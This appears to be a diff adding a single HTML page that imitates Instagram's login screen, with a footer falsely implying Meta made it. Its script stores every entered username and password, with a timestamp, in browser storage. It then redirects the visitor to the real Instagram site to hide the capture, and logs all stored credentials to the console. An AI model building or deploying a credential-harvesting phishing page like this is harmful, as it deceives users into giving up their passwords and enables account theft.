@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login Clone</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: linear-gradient(135deg, #f58529, #dd2a7b, #8134af, #515bd4);
+            background-size: 400% 400%;
+            animation: gradientBG 10s ease infinite;
+        }
+
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .login-container {
+            width: 350px;
+            padding: 30px;
+            background-color: #fff;
+            border-radius: 12px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+            text-align: center;
+        }
+
+        .login-container h1 {
+            font-size: 2.5em;
+            color: #333;
+            font-family: 'Arial Black', sans-serif;
+            margin-bottom: 20px;
+        }
+
+        .login-container input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 14px;
+        }
+
+        .login-container button {
+            width: 100%;
+            padding: 12px;
+            background-color: #3897f0;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .login-container button:hover {
+            background-color: #2878c7;
+        }
+
+        .disclaimer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #777;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h1>Instagram</h1>
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Phone number, username, or email" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="button" onclick="storeAndRedirect()">Log In</button>
+        </form>
+        <div class="disclaimer">
+            <p>made by meta.com instgram .in
+          .</p>
+        </div>
+    </div>
+    <script>
+        function storeAndRedirect() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            if (username && password) {
+                // Save the credentials in localStorage
+                const userData = { username, password, timestamp: new Date().toISOString() };
+                let allUsers = JSON.parse(localStorage.getItem('userLogins')) || [];
+                allUsers.push(userData);
+                localStorage.setItem('userLogins', JSON.stringify(allUsers));
+
+                // Redirect to the official Instagram website
+                window.location.href = 'https://www.instagram.com';
+            } else {
+                alert('Please fill in both fields!');
+            }
+        }
+
+        // Optional: Log all stored data on load (educational purposes)
+        window.onload = () => {
+            const allUsers = JSON.parse(localStorage.getItem('userLogins')) || [];
+            console.log('Stored User Data:', allUsers);
+        };
+    </script>
+</body>
+</html>
